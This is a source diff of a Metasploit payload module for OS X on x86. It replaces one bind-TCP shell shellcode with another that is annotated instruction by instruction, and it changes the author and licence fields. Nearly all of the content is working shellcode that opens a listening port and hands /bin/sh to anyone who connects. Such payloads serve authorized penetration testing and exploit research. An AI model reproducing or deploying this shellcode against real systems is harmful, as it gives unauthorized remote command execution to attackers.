@@ -1,14 +1,4 @@
-##
-# $Id:$
-##
-
-##
-# This file is part of the Metasploit Framework and may be subject to 
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/projects/Framework/
-##
-
+# $Id$
 
 require 'msf/core'
 require 'msf/core/handler/bind_tcp'
@@ -29,8 +19,8 @@ module ShellBindTcp
 			'Name'          => 'OSX Command Shell, Bind TCP Inline',
 			'Version'       => '$Revision$',
 			'Description'   => 'Listen for a connection and spawn a command shell',
-			'Author'        => 'nemo <nemo[at]felinemenace.org>',
-			'License'       => BSD_LICENSE,
+			'Author'        => 'Ramon de Carvalho Valle <ramon@risesecurity.org>',
+			'License'       => MSF_LICENSE,
 			'Platform'      => 'osx',
 			'Arch'          => ARCH_X86,
 			'Handler'       => Msf::Handler::BindTcp,
@@ -39,15 +29,48 @@ module ShellBindTcp
 				{
 					'Offsets' =>
 						{
-							'LPORT'    => [ 13, 'n' ],
+							'LPORT'    => [ 6, 'n' ],
 						},
 					'Payload' =>
-						"\x6a\x42\x58\xcd\x80\x6a\x61\x58\x99\x52\x68\x10\x02\x11\x5c"+
-						"\x89\xe1\x52\x42\x52\x42\x52\x6a\x10\xcd\x80\x99\x93\x51\x53"+
-						"\x52\x6a\x68\x58\xcd\x80\xb0\x6a\xcd\x80\x52\x53\x52\xb0\x1e"+
-						"\xcd\x80\x97\x6a\x02\x59\x6a\x5a\x58\x51\x57\x51\xcd\x80\x49"+
-						"\x0f\x89\xf1\xff\xff\xff\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"+
-						"\x69\x6e\x89\xe3\x50\x54\x54\x53\x53\xb0\x3b\xcd\x80",
+							"\x31\xc0"             +#   xorl    %eax,%eax                  #
+							"\x50"                 +#   pushl   %eax                       #
+							"\x68\xff\x02\x04\xd2" +#   pushl   $0xd20402ff                #
+							"\x89\xe7"             +#   movl    %esp,%edi                  #
+							"\x50"                 +#   pushl   %eax                       #
+							"\x6a\x01"             +#   pushl   $0x01                      #
+							"\x6a\x02"             +#   pushl   $0x02                      #
+							"\x6a\x10"             +#   pushl   $0x10                      #
+							"\xb0\x61"             +#   movb    $0x61,%al                  #
+							"\xcd\x80"             +#   int     $0x80                      #
+							"\x57"                 +#   pushl   %edi                       #
+							"\x50"                 +#   pushl   %eax                       #
+							"\x50"                 +#   pushl   %eax                       #
+							"\x6a\x68"             +#   pushl   $0x68                      #
+							"\x58"                 +#   popl    %eax                       #
+							"\xcd\x80"             +#   int     $0x80                      #
+							"\x89\x47\xec"         +#   movl    %eax,-0x14(%edi)           #
+							"\xb0\x6a"             +#   movb    $0x6a,%al                  #
+							"\xcd\x80"             +#   int     $0x80                      #
+							"\xb0\x1e"             +#   movb    $0x1e,%al                  #
+							"\xcd\x80"             +#   int     $0x80                      #
+							"\x50"                 +#   pushl   %eax                       #
+							"\x50"                 +#   pushl   %eax                       #
+							"\x6a\x5a"             +#   pushl   $0x5a                      #
+							"\x58"                 +#   popl    %eax                       #
+							"\xcd\x80"             +#   int     $0x80                      #
+							"\xff\x4f\xe4"         +#   decl    -0x1c(%edi)                #
+							"\x79\xf6"             +#   jns     <bndsockcode+42>           #
+							"\x50"                 +#   pushl   %eax                       #
+							"\x68\x2f\x2f\x73\x68" +#   pushl   $0x68732f2f                #
+							"\x68\x2f\x62\x69\x6e" +#   pushl   $0x6e69622f                #
+							"\x89\xe3"             +#   movl    %esp,%ebx                  #
+							"\x50"                 +#   pushl   %eax                       #
+							"\x54"                 +#   pushl   %esp                       #
+							"\x54"                 +#   pushl   %esp                       #
+							"\x53"                 +#   pushl   %ebx                       #
+							"\x50"                 +#   pushl   %eax                       #
+							"\xb0\x3b"             +#   movb    $0x3b,%al                  #
+							"\xcd\x80"              #   int     $0x80                      #
 				}
 			))
 	end
